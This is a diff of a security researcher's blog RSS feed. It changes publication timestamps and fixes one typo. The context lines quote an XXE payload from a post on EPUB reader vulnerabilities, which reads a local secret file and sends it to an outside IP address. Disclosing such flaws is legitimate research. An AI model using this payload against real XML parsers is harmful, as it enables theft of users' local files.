@@ -6,8 +6,8 @@
 </description>
     <link>http://s1gnalcha0s.github.io/</link>
     <atom:link href="http://s1gnalcha0s.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 25 Jan 2017 11:29:03 -0500</pubDate>
-    <lastBuildDate>Wed, 25 Jan 2017 11:29:03 -0500</lastBuildDate>
+    <pubDate>Sun, 05 Feb 2017 11:56:30 -0800</pubDate>
+    <lastBuildDate>Sun, 05 Feb 2017 11:56:30 -0800</lastBuildDate>
     <generator>Jekyll v2.5.3</generator>
     
       <item>
@@ -136,7 +136,7 @@
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % d SYSTEM &amp;quot;file:///c:/Users/Documents/secret.txt&amp;quot;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % c &amp;quot;&amp;lt;!ENTITY send SYSTEM &amp;#39;http://123.123.123.123/exfil/%d;&amp;#39;&amp;gt;&lt;/span&gt;&amp;quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;eg., Retriving secret stuff from a users Windows documents folder:
+&lt;p&gt;eg., Retrieving secret stuff from a users Windows documents folder:
 &lt;img src=&quot;/assets/epub/ADE.png&quot; alt=&quot;Image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Apple Transporter&lt;/strong&gt; (underlying tool used to validate metadata and assets and deliver them to the iTunes Store), &lt;a href=&quot;https://support.apple.com/en-us/HT207432&quot;&gt;CVE-2016-7666&lt;/a&gt;.
@@ -163,8 +163,9 @@
 &lt;p&gt;If you got this far, thanks for reading. 👋 &lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://twitter.com/craig_arendt&quot;&gt;@craig&lt;/a&gt;&lt;/p&gt;
+
 </description>
-        <pubDate>Wed, 25 Jan 2017 07:00:00 -0500</pubDate>
+        <pubDate>Wed, 25 Jan 2017 04:00:00 -0800</pubDate>
         <link>http://s1gnalcha0s.github.io/epub/2017/01/25/This-book-reads-you.html</link>
         <guid isPermaLink="true">http://s1gnalcha0s.github.io/epub/2017/01/25/This-book-reads-you.html</guid>
         
@@ -234,7 +235,7 @@
   &lt;li&gt;&lt;code&gt;s1gnalCha0s&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
-        <pubDate>Sat, 31 Jan 2015 07:02:03 -0500</pubDate>
+        <pubDate>Sat, 31 Jan 2015 04:02:03 -0800</pubDate>
         <link>http://s1gnalcha0s.github.io/node/2015/01/31/SSJS-webshell-injection.html</link>
         <guid isPermaLink="true">http://s1gnalcha0s.github.io/node/2015/01/31/SSJS-webshell-injection.html</guid>
         
